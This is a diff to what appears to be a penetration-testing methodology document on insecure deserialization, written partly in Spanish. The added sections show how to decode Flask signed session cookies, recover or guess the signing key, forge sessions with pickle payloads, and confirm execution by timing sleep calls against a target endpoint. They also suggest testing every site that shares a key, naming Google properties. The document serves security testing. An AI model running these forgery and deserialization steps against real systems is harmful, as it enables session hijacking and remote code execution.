@@ -48,6 +48,10 @@ chains_with: [rce, info-disclosure, auth-bypass]
 - Caching/session layers (Redis, Memcached, session files) known to store serialized PHP/
   Java objects, reachable indirectly through another vuln (SSRF, LFI) that lets you write
   to the store.
+- **Signed-but-not-encrypted session cookies** — Flask `session=<payload>.<ts>.<sig>` (a
+  leading dot on the payload = zlib-compressed), Django session cookies with `PickleSerializer`,
+  Express `cookie-session` with weak/default secret. These are readable without the key; if the
+  payload contains a serialized object, the sink is confirmed pending forge capability.
 
 ## Prerequisites
 
@@ -138,6 +142,9 @@ sleep, archivo escrito) atribuible a la deserialización, y la ejecución plena 
 | Gadget chain (Java) | `ysoserial` payload version-matched (CommonsCollections, etc.) | Instanciación de objeto peligroso |
 | Gadget chain (PHP) | `phpggc` chain para la clase de gadget presente | Object-injection a side effect |
 | Canary no-destructivo | gadget que dispara `nslookup TOKEN.oast.site` o sleep | Separar "construye objeto" de "tiene side effect" |
+| Signed cookie decode (Flask) | `base64 → zlib → JSON`, inspeccionar tag `" b"` (bytes/pickle) | Leer el payload sin la key; buscar secretos embebidos |
+| Self-revealing secret | `client_secret`/API key dentro del cookie que firma → re-firmar con HMAC-SHA1 | El secreto está en el dato que protege |
+| Timing blind pickle | `time.sleep(N)` con N variable, medir latencia sobre 3+ puntos | Correlación lineal N↔delay = Demonstrated pickle.loads() |
 
 Surface signals que delatan la clase antes de inyectar:
 - Valores base64/binarios en cookies, hidden fields o bodies que decodifican a un magic byte de la tabla.
@@ -173,6 +180,8 @@ Sin output directo, la confirmación ciega es solo por callback correlacionado p
 | PHP `__wakeup`/`__destruct` hardening | Chain que no dependa de esos magic methods, gadget alterno de `phpggc` | Depende de las clases en el classpath/autoload |
 | Brittleness entre versiones | Reemplazar la chain por una exacta de la versión detectada | Chain de 3.1 fallando en 3.2.1 es esperado, no prueba de seguridad |
 | Firma HMAC sobre el blob | Buscar la clave (weak secret, leak) para re-firmar el estado manipulado | Si el HMAC se verifica antes de deserializar, el sink no se alcanza |
+| Secret auto-revelado en el cookie | Decodificar el payload (no requiere key), extraer credenciales, probar como signing key | La key está dentro del dato firmado → forge completo sin brute-force |
+| Default/weak Flask SECRET_KEY | Diccionario de defaults comunes (`secret-key`, `changeme`, `dev`, nombre del app) | Flask con `DEBUG=True` o deploy descuidado |
 
 ## Root Causes
 
@@ -219,6 +228,64 @@ Sin output directo, la confirmación ciega es solo por callback correlacionado p
   non-destructive canary (DNS/HTTP callback, sleep) to confirm the primitive before any
   escalation, and only with explicit operator sign-off per the human-gate rules.
 
+7. **Signed session cookie inspection (Flask / Django / itsdangerous).** Frameworks that store
+   session state client-side sign the cookie but do not encrypt it — the payload is readable by
+   anyone with `base64`. When the payload contains a serialized object (pickle in Flask, JSON in
+   Django), two attack paths open: (a) information disclosure from the payload itself, and
+   (b) if the signing key is recoverable, full session forgery feeding the deserialization sink.
+
+   **Decode the cookie:**
+   ```bash
+   # Flask itsdangerous format: <payload>.<timestamp>.<signature>
+   # A leading dot on the payload = zlib-compressed
+   COOKIE="eyJfcGV..." # from Set-Cookie: session=...
+   PAYLOAD=$(echo "$COOKIE" | cut -d. -f1)
+   python3 -I -c "
+   import base64, json, zlib
+   raw = base64.urlsafe_b64decode('$PAYLOAD' + '==')
+   try: raw = zlib.decompress(raw)
+   except: pass
+   print(json.dumps(json.loads(raw), indent=2))
+   "
+   ```
+   Inspect the JSON for secrets: OAuth `client_secret`, API keys, tokens, internal URLs. The
+   itsdangerous `" b"` tag (a key with a leading space) marks a bytes value — base64-decode it
+   and check with `pickletools.dis()` for a serialized object.
+
+   **Self-revealing secret — the key is in the cookie it signs:**
+   ```bash
+   # Verify: re-sign with the candidate secret and compare signatures
+   python3 -I -c "
+   import hmac, hashlib
+   key = hashlib.sha1(b'cookie-session' + b'SECRET_HERE').digest()
+   sig = hmac.new(key, b'PAYLOAD.TIMESTAMP', hashlib.sha1).hexdigest()
+   print(sig)  # compare with the cookie's signature field
+   "
+   ```
+   If the signature matches, you have full forge capability. This turns any deserialization sink
+   in the callback (the endpoint that reads the flow/session object back) into an attacker-
+   controlled deserialization — craft a session with an arbitrary pickle in the `" b"` slot,
+   sign it, and trigger the callback.
+
+   **Timing-based blind confirmation (safe, non-destructive):**
+   ```bash
+   # Forge cookies with time.sleep(N), measure response latency across N values
+   for N in 0 3 5 8; do
+     FORGED=$(python3 -I forge_session.py --secret "$SECRET" --pickle "time.sleep($N)")
+     TIME=$(curl -o /dev/null -s -w '%{time_total}' "https://target/callback?state=TOKEN" \
+       -H "Cookie: session=$FORGED")
+     echo "sleep($N) → ${TIME}s"
+   done
+   # Linear correlation between N and response time = Demonstrated pickle.loads() execution
+   ```
+   Controls: no cookie → error; flipped signature byte → error; valid signature + sleep payload
+   → delay proportional to N. The timing correlation across 3+ data points is the proof — a
+   single slow response is not sufficient.
+
+   This pattern applies beyond Flask: any framework storing signed-but-not-encrypted state
+   client-side (Django sessions with `PickleSerializer`, Express `cookie-session` with weak
+   secret, custom HMAC-signed blobs).
+
 ## Chain Anchors
 
 Before declaring this finding complete, probe these escalation paths:
@@ -228,6 +295,7 @@ Before declaring this finding complete, probe these escalation paths:
 3. **Property/field injection** — Does deserializing attacker-controlled data let you set internal fields that bypass app-level validation (role, balance, ownership)?
 4. **Blind deserialization confirmation** — If no direct output is visible, can you confirm execution via an out-of-band channel (DNS/HTTP callback)?
 5. **Cross-service reach** — Is the vulnerable deserialization reachable from an internal queue/message bus, widening the attack surface beyond the HTTP API?
+6. **Secret recovery → forge → deserialize chain** — If the session uses a signed-but-not-encrypted cookie, can you decode the payload, recover the signing key (self-revealing, weak/default, leaked in another endpoint), forge a session with a malicious serialized object, and reach the deserialization sink? Test on all properties sharing the same key (the Google DevSite pattern: one key across firebase.google.com, developer.android.com, etc.).
 
 A finding without chain anchor results is INCOMPLETE. Record each anchor as
 tested/not-applicable/blocked with the reason.
